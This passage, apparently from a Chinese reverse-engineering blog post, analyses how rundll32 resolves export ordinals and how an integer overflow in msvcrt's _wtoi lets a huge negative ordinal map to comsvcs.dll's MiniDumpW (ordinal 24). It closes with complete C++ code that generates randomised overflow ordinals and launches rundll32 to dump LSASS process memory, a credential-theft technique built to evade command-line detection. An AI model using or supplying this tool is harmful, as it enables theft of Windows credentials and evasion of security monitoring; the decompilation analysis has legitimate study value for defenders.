       *          ↓
       *     ANSI 参数
       *
       * 首先计算 a4 的 Unicode 字符串长度。
       */
      v17 = -1;

      do
        ++v17;
      while (a4[v17]);

      v18 = v17 + 1;

      /*
       * 第一次调用 WideCharToMultiByte()。
       *
       * 最后两个输出参数传入 NULL/0，
       * 因此这里并不是实际转换，而是在计算：
       *
       *     Unicode 字符串转换成 ANSI 后需要多少字节。
       */
      cbMultiByte[0] = WideCharToMultiByte(
          0,
          0x400u,
          a4,
          v18,
          0,
          0,
          0,
          0);

      /*
       * 根据上一步得到的大小申请 ANSI 字符串缓冲区。
       */
      v19 = (CHAR *)LocalAlloc(
          0,
          cbMultiByte[0]);

      if (v19)
      {
        /*
         * 第二次调用 WideCharToMultiByte()，
         * 这次提供实际的输出缓冲区，
         * 因此真正完成 Unicode -> ANSI 转换。
         */
        WideCharToMultiByte(
            0,
            0x400u,
            a4,
            v18,
            v19,
            cbMultiByte[0],
            0,
            0);

        /*
         * 保存转换后的 ANSI 参数。
         *
         * 后续真正调用 xxxA 函数时，
         * 就可以使用这个 ANSI 字符串。
         */
        *v24 = v19;

LABEL_20:

        /*
         * 到这里，执行目标所需要的信息已经全部准备完成：
         *
         *     a5 = DLL 模块句柄
         *     a6 = 导出函数地址
         *     a7 = ANSI 命令行参数（如果 xxxA 需要）
         *
         * 返回 1 表示初始化成功。
         */
        *v25 = Library;
        *v26 = CommandFunction;

        return v12;
      }

      /*
       * 如果 ANSI 参数缓冲区申请失败，
       * 则加载资源中的错误提示并显示错误。
       */
      if (LoadStringW(v10, 0x300u, v27, 200))
      {
        v20 = 0;
        v21 = (unsigned int)a4;

LABEL_25:
        _DisplayErrorMessage(
            v10,
            v21,
            v20,
            v27);
      }
    }
    else if (LoadStringW(v10, 0x400u, v27, 200))
    {
      /*
       * CommandFunction == NULL，
       * 说明 _FindCommandFunction() 没有找到指定的导出函数。
       *
       * 此时显示类似“找不到指定过程/入口点”的错误信息。
       */
      v20 = a3;
      v21 = (unsigned int)a2;

      goto LABEL_25;
    }

    /*
     * 只要后续的函数查找或者参数处理失败，
     * 就释放之前成功加载的 DLL，避免留下模块引用。
     */
    FreeLibrary(Library);

    return 0;
  }

  /*
   * LoadLibraryExW() 本身失败，
   * 前面已经完成错误处理，因此返回失败。
   */
  return v12;
}
```

-   `_InitCommandInfo` 是rundll32的核心调度函数：

-   `LoadLibraryExW` 加载 `comsvcs.dll` ，得到 `hModule`
-   `_FindCommandFunction(hModule, "#-999...976", ...)` ，得到 `MiniDumpW` 地址
-   保存函数指针，后续直接调用它

-   把 `_FindCommandFunction` 和这个函数连起来看，这个逻辑大致如下

```c
                    rundll32.exe
                         │
                         ▼
                _InitCommandInfo()
                         │
                         │
                LoadLibraryExW()
                         │
                         ▼
                  加载目标 DLL
                         │
                         ▼
              _FindCommandFunction()
                         │
             ┌───────────┴───────────┐
             │                       │
        "#123"                    "Function"
             │                       │
             ▼                       ▼
       Ordinal查找              FunctionW
                                     │
                                  失败
                                     ▼
                                FunctionA
                                     │
                                  失败
                                     ▼
                                 Function
             │                       │
             └───────────┬───────────┘
                         │
                         ▼
                  得到函数地址
                         │
                         ▼
              如果是 xxxA 且有参数
                         │
                         ▼
                 Unicode → ANSI
                         │
                         ▼
          ┌──────────────┴──────────────┐
          │                             │
       a5 = DLL句柄                 a6 = 函数地址
          │                             │
          └──────────────┬──────────────┘
                         │
                         ▼
                  返回初始化成功
```

-   所以从 `rundll32` 的整体执行流程来看， `_InitCommandInfo()` 可以理解成一个“执行前的初始化/准备函数”： `加载 DLL → 找到 DLL 导出函数 → 根据函数类型处理参数 → 把后续真正调用函数所需要的 DLL 句柄、函数地址和参数准备好`

### 总结

-   现在大致理解了 `rundll32` 的完整逻辑：

-   解析命令行，分离DLL路径、入口点、参数
-   加载DLL
-   用 `_FindCommandFunction` 查找导出函数（ `#` 路径 → `_wtoi` → `GetProcAddress` ）
-   调用找到的函数

-   下一步思考：关键在于 `_wtoi("-9999999999999999999999999999999976")` 返回24。但 `-9999999999999999999999999999999976` 是一个 35 位的负数， `_wtoi` 是字符串转整数的函数，它怎么把这么大的数字变成24，这需要分析 `msvcrt.dll` 中 `_wtoi` 的内部实现

## 分析msvcrt.dll（找到溢出根源）

-   目标：分析 `_wtoi` → `wcstolX` → `wcstoxlX` 三层调用链，理解整数溢出的完整机制：为什么 `a6=1` 参数会导致溢出不停止，累加循环怎么工作， `neg` 指令怎么把溢出结果变成24

### 找到 \_wtoi

-   文件路径

```c
C:\Windows\System32\msvcrt.dll
```

-   查看导出表，找到 `_wtoi`

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/7aac4e799b599a73.png)

### 反编译\_wtoi

-   此时双击跳转到 `0x110105DA0` ，按 `F5` 进行反编译

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/f48f91c7217c11dc.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/b0bc19ea6ac00f2e.png)

```c
// 将宽字符串转换为十进制整数。
// 这里是 msvcrt.dll 中 _wtoi() 的实现。
// 例如：L"123" -> 123，L"-10" -> -10
int __cdecl wtoi(const wchar_t *String)
{
    int result; // 返回值

    // 默认返回 0。
    // 如果传入的字符串指针为空，则直接返回 0。
    result = 0;

    if (String)
    {
        // 将宽字符串按十进制转换为整数。
        //
        // 等价理解为：
        //     wcstolX(String, NULL, 10, 1)
        //
        // 第三个参数 10 表示按照十进制解析。
        // 例如：
        //     L"123" -> 123
        //     L"456" -> 456
        //
        // 在前面的 rundll32 代码中，
        // 这里用于将 "#24" 中的 "24" 转换成 Ordinal
        return wcstolX(String, 0, 10, 1);
    }

    return result;
}
```

-   函数签名： `int _wtoi(const wchar_t *String)` 在这里的作用是宽字符字符串转 `int` （32位有符号），正常情况下输入 `"24"` 返回 `24` ，输入 `"-24"` 返回 `-24`
-   关键： `_wtoi` 只是 `wcstolX` 的包装，它传入了 `a4 = 1` （第四个参数值），这个 `a4` 最终会传到 `wcstoxlX` 的 `a6` 参数，是溢出能继续计算的关键

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2d7c994d0f9b6af0.png)

-   此时需要进入 `wcstolX` 看 `a4` 怎么传给 `wcstoxlX`

### 反编译wcstolX

-   双击 `wcstolX` 进入反编译试图

```c
// wcstolX() 是 _wtoi() 与底层宽字符串数值转换函数之间的中间包装层。
// a1/a2/a3 在这里没有实际参与后续转换，真正继续向下传递的是 a4。
__int64 __fastcall wcstolX(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        int a4)
{
    _locale_tstruct *v4;

    /*
     * 根据当前 CRT 的 Locale 状态选择 Locale 信息。
     *
     * _locale_changed != 0：
     *     表示程序运行过程中修改过 Locale，
     *     这里传 NULL，让后面的 wcstoxlX() 使用当前 Locale。
     *
     * _locale_changed == 0：
     *     表示仍使用 CRT 默认的初始 Locale，
     *     因此直接使用 _initiallocalestructinfo。
     */
    if (_locale_changed)
        v4 = 0;
    else
        v4 = &_initiallocalestructinfo;

    /*
     * 继续调用底层转换函数。
     * 这里最值得注意的是：
     *     _wtoi()
     *         ↓
     *     wcstolX(..., a4 = 1)
     *         ↓
     *     wcstoxlX(v4, 0, a4)
     * 所以 _wtoi() 传入的 a4 = 1
     * 在这里又原样传给了 wcstoxlX()
     */
    return wcstoxlX(v4, 0, a4);
}
```

-   这里 `wcstolX` 也是包装函数，它做了locale处理，然后把 `a4=1` 透传给 `wcstoxlX` 的第6个参数 `a6`
-   目前这条调用链可以整理成如下

```plain
_wtoi(String)
    │
    ▼
wcstolX(String, 0, 10, 1)
                  │
                  │ a4 = 1
                  ▼
        wcstoxlX(v4, 0, 1)
```

-   下一步的参数映射

```plain
_wtoi(String)
  └── wcstolX(String, NULL, 10, a4=1)
        └── wcstoxlX(locale, String, NULL, base=10, flags=0, a6=1)
```

### 反编译wcstoxlX（真正执行字符串到整数转换）

-   双击 `wcstoxlX` 进入反编译视图

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/3236757515828ec3.png)

-   调用链

```c
_wtoi(String)
    ↓
wcstolX(String, 0, 10, 1)
    ↓
wcstoxlX(Locale, String, NULL, 10, 0, 1)
```

#### 初始化、参数检查和符号处理

```c
__int64 __fastcall wcstoxlX(
    struct localeinfo_struct *a1, // locale 信息
    wint_t *a2,                    // 要转换的宽字符串
    wint_t **a3,                   // endptr，保存转换结束位置
    unsigned int a4,               // 进制，这里 _wtoi 传入 10
    int a5,                        // 初始 flags，这里为 0
    int a6                         // 关键参数，_wtoi 传入 1
)
{
    wint_t *v9;                    // 当前字符指针
    wint_t v10;                    // 当前正在处理的字符
    unsigned int v11;              // 最终的数值累加器
    int v12;                       // flags
    unsigned int v13;              // 溢出判断上限
    unsigned int v14;              // 当前字符转换得到的数字
    int v15;                       // 字母转换临时变量
    wint_t *v16;                   // 最终 endptr
    __int64 result;                // 返回值

    // 根据传入的 locale 信息初始化 Locale 环境
    _LocaleUpdate::_LocaleUpdate(
        (_LocaleUpdate *)&Locale,
        a1);

    // 如果调用者提供了 endptr，
    // 默认先让 *a3 指向字符串开头
    if (a3)
        *a3 = a2;

    // 参数检查：
    // a2 不能为 NULL；
    // a4 如果非 0，则必须是合法进制范围
    if (!a2 || a4 && a4 - 2 > 0x22)
    {
        *errno() = 22;             // EINVAL
        invalid_parameter(0, 0, 0, 0, 0);
    }

    // v9 指向字符串第二个字符
    v9 = a2 + 1;

    // 开始转换前清除 errno
    *errno() = 0;

    // 取出第一个字符
    v10 = *a2;

    // 数值累加器初始化为 0
    v11 = 0;

    // 跳过字符串开头的空白字符
    while (iswctype_l(v10, 8u, &Locale))
        v10 = *v9++;

    // 保存初始 flags
    v12 = a5;

    // 当前字符是 '-'，说明输入是负数
    if (v10 == 45)
    {
        // 45 = '-'
        // 设置 v12 的 bit 1，作为“负数标志”
        v12 = a5 | 2;
    }
    else if (v10 != 43)           // 43 = '+'
    {
        // 既不是 '-' 也不是 '+'，直接处理数字
        goto LABEL_14;
    }

    // 如果存在 '+' / '-'，跳过这个符号，
    // v10 变成后面的第一个数字字符
    v10 = *v9++;
```

-   这一段的核心就是

```c
初始化
  ↓
跳过空白
  ↓
检查 + / -
  ↓
如果是 '-' → v12 |= 2
  ↓
开始处理数字
```

-   对于输入 `-9999999999999999999999999999999976` ， 程序首先看到 `v10 == '-'` ， 于是 `v12 |= 2;`（等价于 `v12 = v12 | 2;`，把v12的bit1设置为 `1` ，用这个bit 记录“这是负数”），此时v12 = 2， 然后 `v10 = *v9++;`， 跳过 `-` ，开始处理 `9999999999999999999999999999999976` ， 但是数字本身并没有因为这个 `2` 发生任何变化， 它只是把“这是负数”这个信息保存下来

#### 确定进制，并计算溢出判断上限

```c
LABEL_14:

// 如果 a4 != 0，说明调用者已经指定了进制
// _wtoi() 传入的就是 10，因此直接跳到 LABEL_20
if (a4)
    goto LABEL_20;

// 如果 a4 == 0，则需要根据字符串自动判断进制
if (!(unsigned int)wchartodigit(v10))
{
    // 判断当前字符是不是 X/x
    // 如果不是，则默认使用八进制
    if (((*v9 - 88) & 0xFFDF) != 0)
    {
        a4 = 8;
        goto LABEL_24;
    }

    // 是 X/x，则使用十六进制
    a4 = 16;

LABEL_20:

    // 如果是十六进制，并且当前字符后面存在 0x/0X 前缀，
    // 则跳过这个前缀
    if (a4 == 16 &&
        !(unsigned int)wchartodigit(v10) &&
        ((*v9 - 88) & 0xFFDF) == 0)
    {
        v10 = v9[1];
        v9 += 2;
    }

    goto LABEL_24;
}

// a4 == 0，并且当前字符可以作为数字，
// 默认按照十进制处理
a4 = 10;

LABEL_24:

// 计算溢出判断的安全上限
// UINT_MAX / base
// _wtoi 中：
// a4 = 10
// 所以：
// v13 = 0xFFFFFFFF / 10 = 429496729
v13 = 0xFFFFFFFF / a4;
```

-   实际逻辑

```c
_wtoi()
   ↓
a4 = 10
   ↓
if (a4)
   ↓
直接使用十进制
   ↓
v13 = 0xFFFFFFFF / 10
   ↓
429496729
```

-   `v13` 的含义： `v11` 是 `unsigned int` ，最大值 `0xFFFFFFFF` ，如果 `v11 > 429496729` ，那么 `v11 * 10` 一定会超过 `0xFFFFFFFF` （ `429496729 * 10 = 4294967290` ，接近上限），所以 `v1` 是安全累加上限，超过它就应该停下来检查。

#### 字符转换和数字累加（溢出的核心）

```c
while (1)
  {
    // 把当前 wchar_t 字符转换成数字
    //
    // 例如：
    // '0' → 0
    // '5' → 5
    // '9' → 
    v14 = wchartodigit(v10);
    // 如果不是合法数字字符，wchartodigit 返回 -1

    // 如果已经成功转换成数字，
    // 直接进入下面的进制检查
    if (v14 != -1)
        goto LABEL_31;

    // 当前字符不是 0~9，
    // 检查它是不是 A~Z 或 a~z
    if ((unsigned __int16)(v10 - 65) > 0x19u &&
        (unsigned __int16)(v10 - 97) > 0x19u)
    {
        // 既不是数字，也不是字母
        // 说明数字字符串到这里结束
        break;
    }

    // 大写字母转换为统一形式
    v15 = v10 - 32;

    // 如果本身已经是大写字母，
    // 就不需要减 32
    if ((unsigned __int16)(v10 - 97) > 0x19u)
        v15 = v10;

    // A~F → 10~15
    //
    // 'A' = 65
    // 65 - 55 = 10
    //
    // 'F' = 70
    // 70 - 55 = 15
    v14 = v15 - 55;

LABEL_31:

    // 检查当前数字是否符合当前进制
    //
    // 十进制：
    // v14 必须 < 10
    //
    // 十六进制：
    // v14 必须 < 16
    if (v14 >= a4)
        break;

    // 设置 bit 3：
    // 表示“至少成功解析到了一个有效数字”
    v12 |= 8u;

    // 核心判断：
    //
    // a6 != 0：
    //     直接允许继续计算
    //
    // a6 == 0：
    //     才执行正常的溢出检查
    if (a6 ||
        v11 < v13 ||
        v11 == v13 && v14 <= 0xFFFFFFFF % a4)
    {
        // 核心计算：
        //
        // v11 = v11 * base + digit
        //
        // _wtoi：
        // v11 = v11 * 10 + v14
        v11 = v14 + a4 * v11;
    }
    else
    {
        // 正常情况下走到这里，
        // 说明发生了整数溢出
        v12 |= 4u;

        // 没有 endptr 就直接停止解析
        if (!a3)
            break;
    }

    // 读取下一个字符
    v10 = *v9++;
}
```

-   正常情况下： `v11 = v11 * 10 + digit` ，例如

```c
123

0
 ↓
0 * 10 + 1 = 1
 ↓
1 * 10 + 2 = 12
 ↓
12 * 10 + 3 = 123
```

-   而 `_wtoi()` 的特殊之处就在 `if (a6 || ...)` ，因为 `a6 = 1` ， 所以 `a6 || ...`永远为真，这就导致正常的溢出检查 `v11 < v13` 被绕过
-   单独把这段拿出来看

```c
if (a6 ||
    v11 < v13 ||
    v11 == v13 && v14 <= 0xFFFFFFFF % a4)
{
    v11 = v14 + a4 * v11;
}
```

-   对于 `a6 = 1` ，实际上等同于以下代码，条件恒为真

```c
if (1 || ...)
{
    v11 = v14 + a4 * v11;
}
```

-   所以导致了

```c
// 正常情况
v11 没超过范围
    ↓
继续计算

超过范围
    ↓
停止并设置溢出

// _wtoi()中
v11 没超过范围
    ↓
继续计算

超过范围
    ↓
仍然继续计算
```

-   由于 `v11` 是 `unsigned int` （32位），当结果超过 `32` 位时， `unsigned int` 只保留低32位 ，所以最终数学上等价于 `v11 = (v11 * 10 + digit) mod 2^32`

```c
在_wtoi中：a4 = 10，v14 = digit（当前正在处理的数字字符转换后的数值）

超长数字
   ↓
v11 = v11 * 10 + digit
   ↓
超过32位
   ↓
只保留低32位
   ↓
等价于 mod 2^32
```

-   漏洞的本质： `_wtoi` 传入 `a6=1` ，使 `wcstoxlX` 在溢出时不停止，而是继续做模运算，最终 `v11` = `输入数字 mod 2^32`

#### 返回值处理

```c
  // 循环退出后的返回值处理
LABEL_53:
  if (a3) *a3 = v16;  // 设置 endptr

  // 返回值计算
  result = -v11;               // 默认：取负（对应负数输入）
  if ((v12 & 2) == 0)          // 如果v12的bit没有设置，说明原始字符串不是负数
    result = v11;               // 如果不是负数，直接返回 v11（正数）
  return result;
```

-   逻辑

```c
原始字符串是正数
    ↓
return v11

原始字符串是负数
    ↓
return -v11
```

-   例如 `-9999999999999999999999999999999976` ，前面已经得到 `v11 = 0xFFFFFFE8` ， 同时 `v12 & 2 != 0` ，说明是负数，所以 `result = -v11` ，也就是 `0 - 0xFFFFFFE8 = 0x00000018 = 24`
-   最终

```c
_wtoi(L"-9999999999999999999999999999999976")
                        ↓
                 wcstoxlX(...)
                        ↓
                 v11 = 0xFFFFFFE8
                        ↓
                      -v11
                        ↓
                      24
```

## 四、代码实现

-   前面通过逆向分析可以得出结论， `v11` 是 `unsigned int` （32位），当结果超过 `32` 位时， `unsigned int` 只保留低32位，所以最终数学上等价于 `v11 = (v11 * 10 + digit) mod 2^32`
-   那么意味着，我们的输出不必局限于 `-9999999999999999999999999999999976` ，只需要构造出不同的负数，使其数字部分对 `2^32` 取模后得到 `0xFFFFFFE8` ，经过最后的负号处理后，最终都可以得到返回值 `24`

```c
#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <random>

static int32_t wtoi_overflow(const char* s, int bits = 32) {
    while (*s == ' ' || *s == '\t') s++;
    if (*s == '\0') return 0;

    int sign = 1;
    if (*s == '-') { sign = -1; s++; }
    else if (*s == '+') { s++; }

    uint64_t mask = ((uint64_t)1 << bits) - 1;
    int64_t half = (int64_t)1 << (bits - 1);
    uint64_t result = 0;

    for (; *s; s++) {
        if (*s >= '0' && *s <= '9') {
            result = (result * 10 + (*s - '0')) & mask;
        }
        else {
            break;
        }
    }

    if (sign == -1) {
        result = (uint64_t)(-(int64_t)result) & mask;
    }

    int32_t final_val;
    if (result >= (uint64_t)half) {
        final_val = (int32_t)((int64_t)result - ((int64_t)1 << bits));
    }
    else {
        final_val = (int32_t)result;
    }
    return final_val;
}

struct BigInt {
    std::vector<int> digits;
    bool negative;

    BigInt() : negative(false) {}

    BigInt(const std::string& s) {
        negative = false;
        int start = 0;
        if (!s.empty() && s[0] == '-') { negative = true; start = 1; }
        else if (!s.empty() && s[0] == '+') { start = 1; }
        for (int i = (int)s.size() - 1; i >= start; i--) {
            digits.push_back(s[i] - '0');
        }
        trim();
    }

    BigInt(int64_t val) {
        negative = (val < 0);
        if (negative) val = -val;
        if (val == 0) { digits.push_back(0); return; }
        while (val > 0) { digits.push_back((int)(val % 10)); val /= 10; }
    }

    void trim() {
        while (digits.size() > 1 && digits.back() == 0) digits.pop_back();
        if (digits.size() == 1 && digits[0] == 0) negative = false;
    }

    bool isZero() const { return digits.size() == 1 && digits[0] == 0; }

    int absCompare(const BigInt& other) const {
        if (digits.size() != other.digits.size())
            return digits.size() < other.digits.size() ? -1 : 1;
        for (int i = (int)digits.size() - 1; i >= 0; i--) {
            if (digits[i] != other.digits[i])
                return digits[i] < other.digits[i] ? -1 : 1;
        }
        return 0;
    }

    BigInt absAdd(const BigInt& other) const {
        BigInt res;
        res.digits.clear();
        int carry = 0;
        int maxLen = (int)(digits.size() > other.digits.size() ? digits.size() : other.digits.size());
        for (int i = 0; i < maxLen || carry; i++) {
            int sum = carry;
            if (i < (int)digits.size()) sum += digits[i];
            if (i < (int)other.digits.size()) sum += other.digits[i];
            res.digits.push_back(sum % 10);
            carry = sum / 10;
        }
        return res;
    }

    BigInt absSub(const BigInt& other) const {
        BigInt res;
        res.digits.clear();
        int borrow = 0;
        for (int i = 0; i < (int)digits.size(); i++) {
            int diff = digits[i] - borrow;
            if (i < (int)other.digits.size()) diff -= other.digits[i];
            if (diff < 0) { diff += 10; borrow = 1; }
            else { borrow = 0; }
            res.digits.push_back(diff);
        }
        res.trim();
        return res;
    }

    BigInt operator+(const BigInt& other) const {
        if (negative == other.negative) {
            BigInt res = absAdd(other);
            res.negative = negative;
            res.trim();
            return res;
        }
        int cmp = absCompare(other);
        if (cmp == 0) return BigInt((int64_t)0);
        if (cmp > 0) {
            BigInt res = absSub(other);
            res.negative = negative;
            res.trim();
            return res;
        }
        BigInt res = other.absSub(*this);
        res.negative = other.negative;
        res.trim();
        return res;
    }

    BigInt operator*(const BigInt& other) const {
        BigInt res;
        res.digits.assign(digits.size() + other.digits.size(), 0);
        for (int i = 0; i < (int)digits.size(); i++) {
            int carry = 0;
            for (int j = 0; j < (int)other.digits.size() || carry; j++) {
                int64_t cur = (int64_t)res.digits[i + j] + carry;
                if (j < (int)other.digits.size()) cur += (int64_t)digits[i] * other.digits[j];
                res.digits[i + j] = (int)(cur % 10);
                carry = (int)(cur / 10);
            }
        }
        res.negative = (negative != other.negative);
        res.trim();
        return res;
    }

    std::string toString() const {
        std::string s;
        if (negative && !isZero()) s += '-';
        for (int i = (int)digits.size() - 1; i >= 0; i--)
            s += (char)('0' + digits[i]);
        return s;
    }

    int digitCount() const { return (int)digits.size(); }
};

static std::string generate_overflow_number(int32_t target, int bits = 32, int min_digits = 20) {

    uint64_t mod = (uint64_t)1 << bits;

    uint32_t remainder = (uint32_t)(-(int64_t)target) & 0xFFFFFFFF;

    std::random_device rd;
    std::mt19937_64 gen(rd());

    BigInt modVal((int64_t)mod);
    BigInt remainderBI((int64_t)remainder);

    int64_t k_min = 3000000000LL;
    int64_t k_max = 9000000000LL;

    std::uniform_int_distribution<int64_t> dist(k_min, k_max);
    int64_t k = dist(gen);

    BigInt kVal(k);
    BigInt val = kVal * modVal + remainderBI;

    val.negative = true;
    std::string result = val.toString();

    return result;
}

int main(int argc, char* argv[]) {
    DWORD lsassPID = 0;
    std::string outputFile = "dump.bin";

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            lsassPID = (DWORD)atoi(argv[++i]);
        }
        else if (strcmp(argv[i], "-o") == 0 && i + 1 < argc) {
            outputFile = argv[++i];
        }
    }

    if (lsassPID == 0) {
        printf("Usage: %s -p <lsass_pid> [-o output_file]\n", argv[0]);
        printf("  -p  lsass PID\n");
        printf("  -o  output file (default: dump.bin)\n");
        return 1;
    }

    int32_t target_ordinal = 24;
    std::string overflow_num = generate_overflow_number(target_ordinal, 32, 20);

    char comsvcs_path[MAX_PATH];
    GetSystemDirectoryA(comsvcs_path, MAX_PATH);
    strcat_s(comsvcs_path, "\\comsvcs.dll");

    printf("[*] target ordinal: %d\n", target_ordinal);
    printf("[*] overflow number: %s\n", overflow_num.c_str());
    printf("[*] verify wtoi_overflow (expect %d): %d\n", target_ordinal, wtoi_overflow(overflow_num.c_str(), 32));
    printf("[*] lsass PID: %lu\n", (unsigned long)lsassPID);
    printf("[*] output: %s\n", outputFile.c_str());

    char full_cmdline[4096];
    snprintf(full_cmdline, sizeof(full_cmdline), "rundll32.exe %s,#%s %lu %s full",
        comsvcs_path, overflow_num.c_str(), (unsigned long)lsassPID, outputFile.c_str());

    printf("[*] cmdline: %s\n", full_cmdline);

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    BOOL ret = CreateProcessA(
        NULL,
        full_cmdline,
        NULL, NULL, FALSE,
        0, NULL, NULL,
        &si, &pi
    );

    if (!ret) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] rundll32 started, PID: %lu\n", pi.dwProcessId);
    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    printf("[+] rundll32 exited with code: %lu\n", exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    DWORD attrs = GetFileAttributesA(outputFile.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        printf("[+] dump file created: %s\n", outputFile.c_str());
    }
    else {
        printf("[-] dump file not found, may have failed\n");
    }

    return 0;
}
```
